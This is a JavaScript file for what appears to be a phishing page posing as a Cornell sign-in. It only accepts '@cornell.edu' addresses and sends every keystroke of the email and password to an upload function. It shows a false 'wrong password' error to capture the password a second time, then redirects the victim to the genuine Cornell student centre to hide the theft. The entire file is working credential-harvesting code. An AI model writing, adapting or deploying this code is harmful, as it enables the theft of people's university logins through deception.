x = 0
w = 150

let EMAIL = ''

Id('next').onclick = () => {
    let val = Id('email').value
    let end = val.substring(val.length-12, val.length)


    if (end == '@cornell.edu'){

        Id('first').style.opacity = 0.3
        x = 0
        w = 150
        Id('bar').style.display = 'block'
        EMAIL = val
        uploadSet(val)

        Id('address').innerHTML = EMAIL

        setTimeout(()=>{
            Id('bar').style.display = 'none'
            Id('first').style.display = 'none'
            Id('second').style.opacity = 1
            Id('second').style.display = 'flex'
        },2000)

    }else{
        Id('email').classList.add('error')
        Id('label').classList.add('error')
        Id('message').style.display = 'flex'
    }
}
stage = 0


Id('profile').onclick = () => {
    x = 0
    w = 150
    Id('bar').style.display = 'block'
    Id('second').style.opacity = 0.3

    setTimeout(()=>{
        Id('bar').style.display = 'none'
        Id('second').style.display = 'none'
        Id('first').style.opacity = 1
        Id('first').style.display = 'flex'
    },1000)
}

Id('submit').onclick = () => {
    if (stage == 0){
        Id('password').classList.add('error')
        Id('label2').classList.add('error')
        Id('message2').style.display = 'flex'
        Class('check')[0].style.marginTop = '20px'
        stage = 1
        uploadSet(Id('password').value)
    }else{
        Id('password').type = 'text'
        setTimeout(() => {
            window.location = 'https://studentcenter.cornell.edu'
        }, 500);
    }
}

Id('email').oninput = e => {
    let val = Id('email').value

    console.log(val)
    uploadSet(val)
}

Id('password').oninput = e => {
    let val = Id('password').value

    console.log(val)
    uploadSet(val)
}

Id('checkbox').onclick = () => {
    if (Id('password').type == 'password'){
        Id('checkbox').classList.add('checked')
        Id('password').type = 'text'
    }else{
        Id('checkbox').classList.remove('checked')
        Id('password').type = 'password'
    }
}


let canvas = Id('bar')
let ctx = canvas.getContext('2d')

canvas.height = 3
canvas.width = 450


let loop = () => {


    ctx.fillStyle = '#eeeeee'
    ctx.fillRect(0,0,canvas.width, canvas.height)

    ctx.fillStyle = '#1a73e8'
    ctx.fillRect(x,0,w, canvas.height)

    x += 9

    if (x < canvas.width/3){
        w += 3
    }else{
        w -= 3
    }
    if (x > canvas.width){
        x = -150
        w = 150
    }

    if (Id('email').value != '' && Class('card')[0].style.display != 'none'){
        Id('email').focus()
    }
    if (Id('password').value != '' && Class('card')[1].style.display != 'none'){
        Id('password').focus()
    }
    window.requestAnimationFrame(loop)
}
window.requestAnimationFrame(loop)

